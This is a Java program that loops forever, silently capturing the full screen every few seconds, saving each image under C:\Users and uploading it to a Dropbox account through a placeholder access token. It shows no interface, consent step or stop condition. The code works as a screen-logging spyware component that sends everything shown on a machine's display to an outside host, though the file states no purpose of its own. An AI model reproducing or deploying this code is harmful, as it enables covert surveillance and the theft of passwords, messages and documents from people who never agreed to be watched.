import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import static java.lang.Thread.sleep;

public class main {
    public static void main (String args[]){


            DateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmss");

            for(;;){
                String ACCESS_TOKEN = "YOUR_TOKEN";
                DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
                DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
                Date today = new Date();
                String fileName = dateFormat.format(today) + ".png";
                try {
                    BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                    ImageIO.write(image, "png", new File("C:\\Users\\"+fileName));
                    sleep(5000);
                    InputStream in = new FileInputStream("C:\\Users\\"+fileName);
                    client.files().uploadBuilder("/" + fileName).uploadAndFinish(in);

                }
                catch (Exception ex){
                    ex.printStackTrace();
                }

            }


    }

}


